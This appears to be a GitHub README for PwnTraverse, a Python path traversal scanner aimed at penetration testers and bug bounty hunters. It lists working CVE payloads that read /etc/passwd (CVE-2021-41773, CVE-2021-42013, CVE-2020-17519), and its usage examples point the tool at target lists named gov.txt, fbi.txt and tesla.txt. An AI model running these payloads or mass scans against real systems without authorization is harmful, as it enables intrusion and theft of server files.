

<p align="center">
  <img src="https://i.postimg.cc/vBCMJb3k/Tosca-Business-Man-Minimalist-Banner-Linked-Id-3.png" alt="PwnTraverse Logo" width="990">
</p>

**PwnTraverse** is an advanced **Path Traversal & Endpoint Vulnerability Scanner** designed for **security researchers, bug bounty hunters, and penetration testers**. This tool automates the discovery of **Path Traversal vulnerabilities** and related CVEs, helping security professionals quickly assess and report security issues.

![CLI](https://img.shields.io/badge/CLI-Tool-green)
![Python](https://img.shields.io/badge/Python-3.6%2B-blue)
![PwnTraverse](https://img.shields.io/badge/PwnTraverse-Vulnerability-Exploitation)


---

##  Key Features

- **Automated Path Traversal Detection**  
  Scans and detects path traversal vulnerabilities using a variety of payloads (`../`, double-encoding, bypass tricks).

- **Deep Directory Enumeration**  
  Performs intelligent directory brute-forcing to uncover hidden files and endpoints.

- **CVE & Endpoint Mapping**  
  Correlates discovered endpoints with known CVEs and potential LFI/RCE attack surfaces.

- **Clean & Actionable Reports**  
  Generates structured vulnerability reports for easy documentation and bug bounty submission.



## Installation

1. **Clone the Repository**
```bash
git clone https://github.com/odaysec/PwnTraverse.git
cd PwnTraverse
````

2. **Install Dependencies**
   Ensure you have Python 3.x installed, then run:

```bash
pip install -r requirements.txt
```

3. **(Optional) Create a Virtual Environment**

```bash
python3 -m venv pwntraverse-venv
source pwntraverse-venv/bin/activate   # Linux / MacOS
.\pwntraverse-venv\Scripts\activate   # Windows
```


## Usage
Run the scanner with:

```bash
python3 exploit.py --url https://target.com --wordlist wordlists/common.txt
```
```bash
python exploit.py --file gov.txt --thread 15
python exploit.py --file tesla.txt --ssl
python exploit.py --range 192.168.15.1,192.168.15.100 --thread 30
python exploit.py --file fbi.txt --thread 15 --timeout 3
python exploit.py --file gov.txt --debug
```

Available options:

* `--url` → Target URL
* `--wordlist` → Custom wordlist for directory enumeration
* `--threads` → Number of threads (default: 10)
* `--output` → Save results to file (JSON/HTML)

<p align="center">
  <img src="https://i.postimg.cc/NFYLcvZK/pwntraverse-Man-Banner.png" alt=" Logo" width="1000">
</p>

## Output

```bash
[+] Testing target: https://target.com
[+] Found potential path traversal: https://target.com/download?file=../../../../etc/passwd
[+] CVE-2022-12345 matched for endpoint: /download
[+] Report saved to: reports/scan-2025-09-21.html
```

## Roadmap
* [ ] Add more traversal payloads (double URL encoding, UTF-16 bypass)
* [ ] Add Burp Suite plugin integration
* [ ] Generate PDF reports


## Exploit Payloads
> **File:** `assets/exploits.json`

```json
{
    "CVE-2021-41773": "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "CVE-2021-42013-0": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd",
    "CVE-2020-17519-0": "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
}
```
**References Payloads:** [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)


#### ⚠️ Disclaimer

```text
This project is for educational and security research purposes only.
Do not use it against systems without prior authorization.

The author(s) are not responsible for any damage caused by misuse of this tool,
including but not limited to data loss, system compromise, or legal consequences.
By using this tool, you agree to take full responsibility for your actions.
````



<p align="center">
  <a href="https://star-history.com/#odaysec/PwnTraverse&Date">
   <picture>
     <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=odaysec/PwnTraverse&type=Date&theme=dark" />
     <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=odaysec/PwnTraverse&type=Date" />
     <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=odaysec/confluPwn&type=Date" />
   </picture>
  </a>
